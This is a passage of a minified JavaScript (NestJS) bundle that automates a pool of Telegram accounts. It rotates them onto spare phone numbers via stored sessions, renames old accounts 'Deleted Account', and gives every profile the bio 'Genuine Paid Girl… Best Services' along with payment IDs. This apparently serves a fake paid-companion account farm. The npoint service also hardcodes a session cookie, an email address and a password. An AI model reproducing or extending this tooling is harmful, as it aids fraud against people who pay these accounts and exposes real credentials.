${e}`,R),(0,b.toBoolean)(process.env.AUTO_CLIENT_SETUP)&&Date.now()>R+24e4){R=Date.now();const i=await this.findOne(e),n=i.mobile;await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Received New Client Request for - ${e} - OldNumber: ${i.mobile} || ${i.username}`),console.log(t),await O.connectionManager.disconnectAll();const o={availableDate:{$lte:new Date(Date.now()).toISOString().split("T")[0]},channels:{$gt:200}},r=(await this.bufferClientService.executeQuery(o,{tgId:1}))[0];try{if(r){this.telegramService.setActiveClientSetup({...t,clientId:e,existingMobile:n,newMobile:r.mobile}),await O.connectionManager.getClient(r.mobile);const i=await this.telegramService.createNewSession(r.mobile);await this.updateClientSession(i)}else await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Buffer Clients not available`),console.log("Buffer Clients not available")}catch(e){(0,C.parseError)(e),console.log("Removing buffer as error");const t=new Date(Date.now()+2592e5).toISOString().split("T")[0];await this.bufferClientService.createOrUpdate(r.mobile,{availableDate:t}),this.telegramService.setActiveClientSetup(void 0)}finally{await O.connectionManager.unregisterClient(r.mobile)}}else console.log("Profile Setup Recently tried, wait ::",R-Date.now())}async updateClientSession(e){try{let t="";console.log("Updating Client Session");const i=this.telegramService.getActiveClientSetup(),{days:n,archiveOld:o,clientId:r,existingMobile:a,formalities:s,newMobile:c}=i;await O.connectionManager.disconnectAll(),await(0,y.sleep)(2e3);const l=await this.findOne(r);await O.connectionManager.getClient(c,{handler:!0,autoDisconnect:!1});const p=l.name.split(" ")[0],d=l.name.split(" ")[1],u=`${p[0].toUpperCase()+p.slice(1)}_${(d?d[0].toUpperCase()+d.slice(1):"").slice(0,3)}`+(0,b.fetchNumbersFromString)(r);try{t=await this.telegramService.updateUsername(c,u)}catch(e){(0,C.parseError)(e,"Error in updating username",!0)}await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Updated username for NewNumber:${c} || ${t}`),await O.connectionManager.unregisterClient(c);const m=(await this.usersService.search({mobile:a}))[0],g=await this.findOne(r);await this.update(r,{mobile:c,username:t,session:e}),await(0,I.fetchWithTimeout)(g.deployKey,{},1),await this.bufferClientService.remove(c),setTimeout((async()=>{await this.updateClient(r)}),15e3);try{if(m)try{if((0,b.toBoolean)(s)?(await O.connectionManager.getClient(a,{handler:!0,autoDisconnect:!1}),console.log("Started Formalities"),await this.telegramService.updateNameandBio(a,"Deleted Account",`New Acc: @${t}`),await this.telegramService.deleteProfilePhotos(a),await this.telegramService.updateUsername(a,""),await this.telegramService.updatePrivacyforDeletedAccount(a),console.log("Formalities finished"),await O.connectionManager.unregisterClient(a),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Formalities finished`)):console.log("Formalities skipped"),o){const e={mobile:a,availableDate:new Date(Date.now()+24*(n+1)*60*60*1e3).toISOString().split("T")[0],session:m.session,tgId:m.tgId,channels:170},t=await this.bufferClientService.createOrUpdate(a,e);console.log("client Archived: ",t),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Client Archived`)}else console.log("Client Archive Skipped"),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Client Archive Skipped`)}catch(e){console.log("Cannot Archive Old Client");const t=(0,C.parseError)(e,"Error in Archiving Old Client",!0);(0,b.contains)(t.message.toLowerCase(),["expired","unregistered","deactivated","session_revoked","user_deactivated_ban"])?(console.log("Deleting User: ",m.mobile),await this.bufferClientService.remove(m.mobile),await this.archivedClientService.remove(m.mobile)):console.log("Not Deleting user")}}catch(e){(0,C.parseError)(e,"Error in Archiving Old Client outer",!0),console.log("Error in Archiving Old Client")}this.telegramService.setActiveClientSetup(void 0),console.log("Update finished Exitting Exiiting TG Service"),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Update finished`),await O.connectionManager.disconnectAll()}catch(e){(0,C.parseError)(e,"Error in updating client session",!0),this.telegramService.setActiveClientSetup(void 0)}}async updateClient(e){const t=Date.now(),i=this.lastUpdateMap.get(e)||0;if(t-i<3e4)return void console.log(`Skipping update for ${e} - cooldown period not elapsed. Try again in ${Math.ceil((3e4-(t-i))/1e3)} seconds`);const n=await this.findOne(e);try{this.lastUpdateMap.set(e,t),await P.CloudinaryService.getInstance(n?.dbcoll?.toLowerCase());const i=await O.connectionManager.getClient(n.mobile,{handler:!1});await(0,y.sleep)(2e3);const o=await i.getMe();if(!o.username||o.username!==n.username||!o.username?.toLowerCase().startsWith(o.firstName.split(" ")[0].toLowerCase())){const t=await this.findOne(e),n=t.name.split(" ")[0],o=t.name.split(" ")[1],r=`${n[0].toUpperCase()+n.slice(1)}_${(o?o[0].toUpperCase()+o.slice(1):"").slice(0,3)}`+(0,b.fetchNumbersFromString)(e),a=await i.updateUsername(r);await this.update(t.clientId,{username:a})}await(0,y.sleep)(1e3),o.firstName!==n.name&&await i.updateProfile(n.name,"Genuine Paid Girl🥰, Best Services❤️"),await(0,y.sleep)(1e3),await i.deleteProfilePhotos(),await(0,y.sleep)(1e3),await i.updatePrivacy(),await(0,y.sleep)(1e3);const r=process.cwd();console.log(r,"trying to update dp"),await i.updateProfilePic(w.join(r,"dp1.jpg")),await(0,y.sleep)(1e3),await i.updateProfilePic(w.join(r,"dp2.jpg")),await(0,y.sleep)(1e3),await i.updateProfilePic(w.join(r,"dp3.jpg")),await(0,y.sleep)(1e3)}catch(t){this.lastUpdateMap.delete(e),(0,C.parseError)(t)}finally{O.connectionManager.unregisterClient(n.mobile)}}async updateClients(){const e=await this.findAll();for(const t of e)await this.updateClient(t.clientId)}async generateNewSession(e,t=1){try{console.log("String Generation started"),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=String Generation started for NewNumber:${e}`),await(0,y.sleep)(1e3);const i=await(0,I.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${e}&force=true`,{timeout:15e3},1);i?(console.log("Code Sent successfully",i.data),await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Code Sent successfully`),await this.bufferClientService.update(e,{availableDate:new Date(Date.now()+864e5).toISOString().split("T")[0]})):(await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Failed to send Code`),console.log("Failed to send Code",i),t<2&&(await(0,y.sleep)(8e3),await this.generateNewSession(e,t+1)))}catch(i){console.log(i),t<2&&(await(0,y.sleep)(8e3),await this.generateNewSession(e,t+1))}}async executeQuery(e,t,i,n){try{if(!e)throw new d.BadRequestException("Query is invalid.");const o=this.clientModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new d.InternalServerErrorException(e.message)}}async addPromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$addToSet:{promoteMobile:t}},{new:!0}).exec()}async removePromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$pull:{promoteMobile:t}},{new:!0}).exec()}};t.ClientService=D,t.ClientService=D=r([(0,d.Injectable)(),c(0,(0,u.InjectModel)(g.Client.name)),c(1,(0,d.Inject)((0,d.forwardRef)((()=>p.TelegramService)))),c(2,(0,d.Inject)((0,d.forwardRef)((()=>h.BufferClientService)))),c(3,(0,d.Inject)((0,d.forwardRef)((()=>f.UsersService)))),c(4,(0,d.Inject)((0,d.forwardRef)((()=>v.ArchivedClientService)))),s("design:paramtypes",[m.Model,p.TelegramService,h.BufferClientService,f.UsersService,v.ArchivedClientService,S.NpointService])],D)},9815:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateClientDto=void 0;const r=i(9742);class a{}t.CreateClientDto=a,n([(0,r.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),o("design:type",String)],a.prototype,"channelLink",void 0),n([(0,r.ApiProperty)({example:"shruthi",description:"Database collection name"}),o("design:type",String)],a.prototype,"dbcoll",void 0),n([(0,r.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),o("design:type",String)],a.prototype,"link",void 0),n([(0,r.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),o("design:type",String)],a.prototype,"name",void 0),n([(0,r.ApiProperty)({example:"+916265240911",description:"Phone number of the user"}),o("design:type",String)],a.prototype,"mobile",void 0),n([(0,r.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),o("design:type",String)],a.prototype,"password",void 0),n([(0,r.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),o("design:type",String)],a.prototype,"repl",void 0),n([(0,r.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),o("design:type",String)],a.prototype,"promoteRepl",void 0),n([(0,r.ApiProperty)({example:"1BQANOTEuMTA4LjUg==",description:"Session token"}),o("design:type",String)],a.prototype,"session",void 0),n([(0,r.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),o("design:type",String)],a.prototype,"clientId",void 0),n([(0,r.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),o("design:type",String)],a.prototype,"deployKey",void 0),n([(0,r.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),o("design:type",String)],a.prototype,"mainAccount",void 0),n([(0,r.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),o("design:type",String)],a.prototype,"product",void 0),n([(0,r.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user",required:!1,type:[String]}),o("design:type",Array)],a.prototype,"promoteMobile",void 0),n([(0,r.ApiProperty)({example:"paytmqr281005050101xv6mfg02t4m9@paytm",description:"Paytm QR ID of the user",required:!1}),o("design:type",String)],a.prototype,"qrId",void 0),n([(0,r.ApiProperty)({example:"myred1808@postbank",description:"Google Pay ID of the user",required:!1}),o("design:type",String)],a.prototype,"gpayId",void 0)},1167:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchClientDto=void 0;const r=i(9742),a=i(4922),s=i(7403);class c{}t.SearchClientDto=c,n([(0,r.ApiPropertyOptional)({description:"Client ID of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),(0,s.Matches)(/^[a-z0-9_-]{3,50}$/i,{message:"Invalid client ID format"}),o("design:type",String)],c.prototype,"clientId",void 0),n([(0,r.ApiPropertyOptional)({description:"Database collection name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"dbcoll",void 0),n([(0,r.ApiPropertyOptional)({description:"Channel link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"channelLink",void 0),n([(0,r.ApiPropertyOptional)({description:"Link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),o("design:type",String)],c.prototype,"link",void 0),n([(0,r.ApiPropertyOptional)({description:"Name of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"name",void 0),n([(0,r.ApiPropertyOptional)({description:"Phone number of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{message:"Invalid phone number format"}),o("design:type",String)],c.prototype,"number",void 0),n([(0,r.ApiPropertyOptional)({description:"Password of the client"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"password",void 0),n([(0,r.ApiPropertyOptional)({description:"Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),o("design:type",String)],c.prototype,"repl",void 0),n([(0,r.ApiPropertyOptional)({description:"Promotion Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),o("design:type",String)],c.prototype,"promoteRepl",void 0),n([(0,r.ApiPropertyOptional)({description:"Clientname of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"clientName",void 0),n([(0,r.ApiPropertyOptional)({description:"Deployment key URL"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),o("design:type",String)],c.prototype,"deployKey",void 0),n([(0,r.ApiPropertyOptional)({description:"Main account of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"mainAccount",void 0),n([(0,r.ApiPropertyOptional)({description:"Product associated with the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"product",void 0),n([(0,r.ApiPropertyOptional)({description:"Promote mobile numbers of the client"}),(0,a.Transform)((({value:e})=>e?.map((e=>e?.trim())))),(0,s.IsOptional)(),(0,s.IsArray)(),(0,s.ArrayNotEmpty)({message:"Promote mobile numbers must not be empty if provided"}),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{each:!0,message:"Invalid phone number format in promoteMobile"}),o("design:type",Array)],c.prototype,"promoteMobile",void 0),n([(0,r.ApiPropertyOptional)({description:"Paytm QR ID of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"qrId",void 0),n([(0,r.ApiPropertyOptional)({description:"Google Pay ID of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"gpayId",void 0)},7908:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateClientDto=void 0;const n=i(9742),o=i(9815);class r extends((0,n.PartialType)(o.CreateClientDto)){}t.UpdateClientDto=r},1013:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientSchema=t.Client=void 0;const r=i(5839),a=i(9742);let s=class{};t.Client=s,n([(0,a.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"channelLink",void 0),n([(0,a.ApiProperty)({example:"shruthi",description:"Database collection name"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"dbcoll",void 0),n([(0,a.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"link",void 0),n([(0,a.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"name",void 0),n([(0,a.ApiProperty)({example:"916265240911",description:"mobile number of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"mobile",void 0),n([(0,a.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"password",void 0),n([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"repl",void 0),n([(0,a.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"promoteRepl",void 0),n([(0,a.ApiProperty)({example:"1BQANOTEuM==",description:"Session token"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"session",void 0),n([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"username",void 0),n([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"clientId",void 0),n([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"deployKey",void 0),n([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"mainAccount",void 0),n([(0,a.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"product",void 0),n([(0,a.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user"}),(0,r.Prop)({required:!0,type:[String]}),o("design:type",Array)],s.prototype,"promoteMobile",void 0),n([(0,a.ApiProperty)({example:"paytmqr281005050101xv6mfg02t4m9@paytm",description:"Paytm QR ID of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"qrId",void 0),n([(0,a.ApiProperty)({example:"myred1808@postbank",description:"Google Pay ID of the user"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"gpayId",void 0),t.Client=s=n([(0,r.Schema)({collection:"clients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ClientSchema=r.SchemaFactory.createForClass(s)},5321:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointController=void 0;const a=i(3563),s=i(6954),c=i(9742);let l=class{constructor(e){this.npointService=e}async fetchDocument(e){try{return await this.npointService.fetchDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async postDocument(e){try{return await this.npointService.postDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async fetchAllDocuments(){try{return await this.npointService.fetchAllDocuments()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async updateDocument(e,t){try{return await this.npointService.updateDocument(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.NpointController=l,n([(0,a.Get)("documents/:id"),(0,c.ApiOperation)({summary:"Fetch a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to fetch"}),(0,c.ApiResponse)({status:200,description:"Document fetched successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),r(0,(0,a.Param)("id")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],l.prototype,"fetchDocument",null),n([(0,a.Post)("documents"),(0,c.ApiOperation)({summary:"Post a new document"}),(0,c.ApiBody)({description:"The document to post",schema:{example:{title:"My Document",content:"This is the content of the document."}}}),(0,c.ApiResponse)({status:201,description:"Document posted successfully"}),(0,c.ApiResponse)({status:400,description:"Invalid input"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"postDocument",null),n([(0,a.Get)("documents"),(0,c.ApiOperation)({summary:"Fetch all documents"}),(0,c.ApiResponse)({status:200,description:"List of all documents fetched successfully"}),(0,c.ApiResponse)({status:500,description:"Internal server error"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"fetchAllDocuments",null),n([(0,a.Put)("documents/:id"),(0,c.ApiOperation)({summary:"Update a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to update"}),(0,c.ApiBody)({description:"The updated document",schema:{example:{title:"Updated Document",content:"This is the updated content of the document."}}}),(0,c.ApiResponse)({status:200,description:"Document updated successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),r(0,(0,a.Param)("id")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,Object]),o("design:returntype",Promise)],l.prototype,"updateDocument",null),t.NpointController=l=n([(0,c.ApiTags)("NPoint API"),(0,a.Controller)("npoint"),o("design:paramtypes",[s.NpointService])],l)},889:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointModule=void 0;const o=i(3563),r=i(6954),a=i(5321);let s=class{};t.NpointModule=s,t.NpointModule=s=n([(0,o.Module)({controllers:[a.NpointController],providers:[r.NpointService],exports:[r.NpointService]})],s)},6954:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointService=void 0;const a=i(3563),s=r(i(8938));let c=n=class{constructor(){this.logger=new a.Logger(n.name),this.csrfToken=null,this.cookie="_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5",this.baseUrl="https://www.npoint.io",this.signInUrl="https://www.npoint.io/users/sign_in"}async fetchCsrfToken(){this.logger.debug("Fetching CSRF token...");try{let e=JSON.stringify({user:{email:"dodieajt@gmail.com",password:"Ajtdmwajt1@"}}),t={method:"post",maxBodyLength:1/0,url:this.signInUrl,headers:{"Content-Type":"application/json",Cookie:this.cookie},data:e};const i=await s.default.request(t);if(console.log("Cookie:",i.headers["set-cookie"][0]),this.cookie=i.headers["set-cookie"][0],this.csrfToken=await this.fetchCsrfTokenFromHtml(i.data),!this.csrfToken)throw new Error("CSRF token not found in the sign-in response.");return this.logger.debug("CSRF token fetched successfully."),this.csrfToken}catch(e){throw this.logger.error(`Failed to fetch CSRF token: ${e.message}`),new Error(`Failed to fetch CSRF token: ${e.message}`)}}async ensureCsrfToken(){this.csrfToken||await this.fetchCsrfToken()}async fetchDocument(e){this.logger.debug(`Fetching document with ID: ${e}`),await this.ensureCsrfToken();try{const t=await s.default.get(`${this.baseUrl}/documents/${e}`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} fetched successfully.`),t.data}catch(t){throw this.logger.error(`Failed to fetch document with ID: ${e}: ${t.message}`),new Error(`Failed to fetch document: ${t.message}`)}}async postDocument(e){this.logger.debug("Posting a new document..."),await this.ensureCsrfToken();try{const t=await s.default.post(`${this.baseUrl}/documents`,{generate_contents:!0},{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document posted successfully. Updating document with token: ${t.data.token}`),await this.updateDocument(t.data.token,e),t.data}catch(e){throw this.logger.error(`Failed to post document: ${e.message}`),new Error(`Failed to post document: ${e.message}`)}}async updateDocument(e,t){this.logger.debug(`Updating document with ID: ${e}`),await this.ensureCsrfToken();const i={contents:JSON.stringify(t),original_contents:JSON.stringify(t),schema:null,original_schema:""};try{const t=await s.default.put(`${this.baseUrl}/documents/${e}`,i,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} updated successfully.`),t.data}catch(t){throw this.logger.error(`Failed to update document with ID: ${e}: ${t.message}`),new Error(`Failed to update document: ${t.message}`)}}async fetchAllDocuments(){await this.ensureCsrfToken();try{return(await s.default.get(`${this.baseUrl}/documents`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}})).data}catch(e){throw new Error(`Failed to fetch all documents: ${e.message}`)}}async fetchCsrfTokenFromHtml(e){try{const t=e.match(/<meta name="csrf-token" content="([^"]+)"/);if(!t||!t[1])throw new Error("CSRF token not found in the HTML response.");const i=t[1];return console.log("CSRF Token:",i),i}catch(e){console.error("Error fetching CSRF token:",e)}}};t.NpointService=c,t.NpointService=c=n=o([(0,a.Injectable)()],c)},8977:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteClientDto=void 0;const r=i(9742),a=i(7403);class s{}t.CreatePromoteClientDto=s,n([(0,r.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"tgId",void 0),n([(0,r.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"mobile",void 0),n([(0,r.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"availableDate",void 0),n([(0,r.ApiProperty)({description:"lastActive identifier",example:"2023-06-22"}),(0,a.IsString)(),o("design:type",String)],s.prototype,"lastActive",void 0),n([(0,r.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),o("design:type",Number)],s.prototype,"channels",void 0)},3993:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchPromoteClientDto=void 0;const r=i(9742),a=i(7403);class s{}t.SearchPromoteClientDto=s,n([(0,r.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"tgId",void 0),n([(0,r.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"mobile",void 